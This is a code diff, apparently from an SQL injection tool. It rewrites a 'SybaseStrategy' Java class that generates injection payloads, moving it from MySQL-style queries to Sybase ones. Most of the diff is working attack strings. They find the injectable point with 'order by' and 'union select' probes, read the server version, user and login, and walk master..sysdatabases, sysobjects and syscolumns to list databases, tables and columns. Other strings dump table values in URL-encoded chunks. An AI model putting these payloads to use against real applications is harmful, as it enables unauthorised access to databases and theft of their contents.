@@ -15,136 +15,51 @@ public class SybaseStrategy implements ISQLStrategy {
     @Override
     public String getSchemaInfos() {
         return 
-            "concat(" +
-                "hex(" +
-                    "concat_ws(" +
-                        "0x7b257d," +
-                        "version()," +
-                        "database()," +
-                        "user()," +
-                        "CURRENT_USER" +
-                    ")" +
-                ")" +
-                "," +
-                "0x69" +
-            ")";
+            "select+bintostr(convert(varbinary(16384)," +
+                "@@version%2B'{%}'%2Bdb_name()%2B'{%}'%2Buser_name()%2B'{%}'%2Bsuser_name()" +
+            "))%2B'i'r";
     }
 
     @Override
     public String getSchemaList() {
         return 
-            "select+" +
-                "concat(" +
-                    "group_concat(" +
-                        "0x6868," +
-                        "r," +
-                        "0x6a6a," +
-                        "hex(cast(q+as+char))," +
-                        "0x6868" +
-                        "+order+by+r+" +
-                        "separator+0x6767" +
-                    ")," +
-                    "0x69" +
-                ")" +
-            "from(" +
-                "select+" +
-                    "hex(cast(TABLE_SCHEMA+as+char))r," +
-                    "count(TABLE_NAME)q+" +
-                "from+" +
-                    "INFORMATION_SCHEMA.tables+" +
-                "group+by+r{limit}" +
-            ")x";
+            "select+rr%2b(CASE+WHEN+c>=nb+then+'i'+END)%2b'i'r+from+(select+'hh'%2bbintostr(convert(varbinary(16384),t.name))%2b'jj30hh'rr,count(*)c+" +
+            "from(select+distinct++name+from+master..sysdatabases)t,(select+distinct+name+from+master..sysdatabases)t1+" +
+            "where+t.name>=t1.name+" +
+            "group+by+t.name{limit})a,(select+count(*)nb+from+master..sysdatabases)x";
     }
 
     @Override
     public String getTableList(Database database) {
         return 
-            "select+" +
-                "concat(" +
-                    "group_concat(" +
-                        "0x6868," +
-                        "hex(cast(r+as+char))," +
-                        "0x6a6a," +
-                        "hex(cast(ifnull(q,0x30)+as+char))," +
-                        "0x6868+" +
-                        "order+by+r+" +
-                        "separator+0x6767" +
-                    ")," +
-                    "0x69" +
-                ")" +
-            "from(" +
-                "select+" +
-                    "TABLE_NAME+r," +
-                    "table_rows+q+" +
-                "from+" +
-                    "information_schema.tables+" +
-                "where+" +
-                    "TABLE_SCHEMA=0x" + ToolsString.strhex(database.toString())  + "+" +
-                "order+by+r{limit}" +
-            ")x";
+            "select+rr%2b(CASE+WHEN+c>=nb+then+'i'+END)%2b'i'r+from+(select+'hh'%2bbintostr(convert(varbinary(16384),t.name))%2b'jj30hh'rr,count(*)c+" +
+            "from(select+distinct+name+from+" + database + "..sysobjects+where+type='U')t,(select+distinct+name+from+" + database + "..sysobjects+where+type='U')t1+" +
+            "where+t.name>=t1.name+" +
+            "group+by+t.name{limit})a,(select+count(*)nb+from+" + database + "..sysobjects+where+type='U')x";
     }
 
     @Override
     public String getColumnList(Table table) {
         return 
-            "select+" +
-                "concat(" +
-                    "group_concat(" +
-                        "0x6868," +
-                        "hex(cast(n+as+char))," +
-                        "0x6a6a," +
-                        "0x3331," +
-                        "0x6868+" +
-                        "order+by+n+" +
-                        "separator+0x6767" +
-                    ")," +
-                    "0x69" +
-                ")" +
-            "from(" +
-                "select+" +
-                    "COLUMN_NAME+n+" +
-                "from+" +
-                    "information_schema.columns+" +
-                "where+" +
-                    "TABLE_SCHEMA=0x" + ToolsString.strhex(table.getParent().toString()) + "+" +
-                    "and+" +
-                    "TABLE_NAME=0x" + ToolsString.strhex(table.toString()) + "+" +
-                "order+by+n{limit}" +
-            ")x";
+            "select+rr%2b(CASE+WHEN+c>=nb+then+'i'+END)%2b'i'r+from+(select+'hh'%2bbintostr(convert(varbinary(16384),t.name))%2b'jj30hh'rr,count(*)c+" +
+            "from(select+distinct+c.name+from+" + table.getParent() + "..syscolumns+c+inner+join+" + table.getParent() + "..sysobjects+t+on+c.id=t.id+where+t.name='" + table + "')t,(select+distinct+c.name+from+" + table.getParent() + "..syscolumns+c+inner+join+" + table.getParent() + "..sysobjects+t+on+c.id=t.id+where+t.name='" + table + "')t1+" +
+            "where+t.name>=t1.name+" +
+            "group+by+t.name{limit})a,(select+count(*)nb+from+" + table.getParent() + "..syscolumns+c+inner+join+" + table.getParent() + "..sysobjects+t+on+c.id=t.id+where+t.name='" + table + "')x";
     }
 
     @Override
     public String getValues(String[] columns, Database database, Table table) {
         String formatListColumn = ToolsString.join(columns, "{%}");
         
-        // 7f caractère d'effacement, dernier code hexa supporté par mysql, donne 3f=>? à partir de 80
-        //        formatListColumn = formatListColumn.replace("{%}", "`),0x7f,trim(`" );
+        formatListColumn = formatListColumn.replace("{%}", "%2b'')))%2bchar(127)%2brtrim(ltrim(convert(varchar,");
         
-        // 7f caractère d'effacement, dernier code hexa supporté par mysql, donne 3f=>? à partir de 80
-        formatListColumn = formatListColumn.replace("{%}", "`,0x00)),0x7f,trim(ifnull(`");
-        
-        //        formatListColumn = "trim(`" + formatListColumn + "`)" ;
-        formatListColumn = "trim(ifnull(`" + formatListColumn + "`,0x00))";
-        
+        formatListColumn = "rtrim(ltrim(convert(varchar," + formatListColumn + "%2b'')))";
+
         return 
-            "select+concat(" +
-                "group_concat(" +
-                    "0x6868," +
-                    "r," +
-                    "0x6a6a," +
-                    "hex(cast(q+as+char))," +
-                    "0x6868" +
-                    "+order+by+r+separator+0x6767" +
-                ")," +
-                "0x69" +
-            ")from(" +
-                "select+" +
-                    "hex(cast(concat(" + formatListColumn + ")as+char))r," +
-                    "count(*)q+" +
-                "from+" +
-                    "`" + database + "`.`" + table + "`+" +
-                "group+by+r{limit}" +
-            ")x";
+            "select+rr%2b(CASE+WHEN+c>=nb+then+'i'+END)%2b'i'r+from+(select+'hh'%2bbintostr(convert(varbinary(16384),t.s))%2b'jj30hh'rr,count(*)c+" +
+            "from(select+distinct+" + formatListColumn +"s+from+" + database + ".." + table + ")t,(select+distinct+" + formatListColumn +"s+from+" + database + ".." + table + ")t1+" +
+            "where+t.s>=t1.s+" +
+            "group+by+t.s{limit})a,(select+count(distinct+" + formatListColumn +")nb+from+" + database + ".." + table + ")x";
     }
 
     @Override
@@ -286,19 +201,8 @@ public class SybaseStrategy implements ISQLStrategy {
 
     @Override
     public String normalStrategy(String sqlQuery, String startPosition) {
-        return 
-            "select+" +
-                /**
-                 * If reach end of string (concat(SQLi+NULL)) then concat nullifies the result
-                 */
-                "concat(" +
-                    "0x53514c69," +
-                    "mid(" +
-                        "(" + sqlQuery + ")," +
-                        startPosition + "," +
-                        "65536" +
-                    ")" +
-                ")";
+        return
+            "select'SQLi'%2bsubstring(r," + startPosition + ",65536)from(" + sqlQuery + ")x";
     }
 
     @Override
@@ -322,27 +226,30 @@ public class SybaseStrategy implements ISQLStrategy {
         return 
             MediatorModel.model().initialQuery.replaceAll(
                 "1337(" + ToolsString.join(indexes, "|") + ")7331",
-                "(select+concat(0x53514c69,$1,repeat(0xb8,1024),0x694c5153))"
+                "(select'SQLi'%2b$1,replicate('#',1024)%2b'iLQS')"
             );
     }
 
     @Override
     public String initialQuery(Integer nbFields) {
+        String replaceTag = "";
         List<String> fields = new ArrayList<String>(); 
         for (int i = 1 ; i <= nbFields ; i++) {
-            fields.add("1337"+ i +"7330%2b1");
+            fields.add("*");
+            replaceTag = "select+convert(varchar,(1337"+ i +"7330%2b1))a";
         }
-        return "+union+select+" + ToolsString.join(fields.toArray(new String[fields.size()]), ",") + "--+";
+        return "+union+select" + ToolsString.join(fields.toArray(new String[fields.size()]), ",") + "from(" + replaceTag + ")b+";
     }
 
     @Override
     public String insertionCharacterQuery() {
-        return "+order+by+1337--+";
+        return "+order+by+1337+";
     }
 
     @Override
     public String getLimit(Integer limitSQLResult) {
-        return "+limit+" + limitSQLResult + ",65536";
+        return 
+            "+having+count(*)+between+" + (limitSQLResult+1) + "+and+" + (limitSQLResult+1);
     }
 
 }
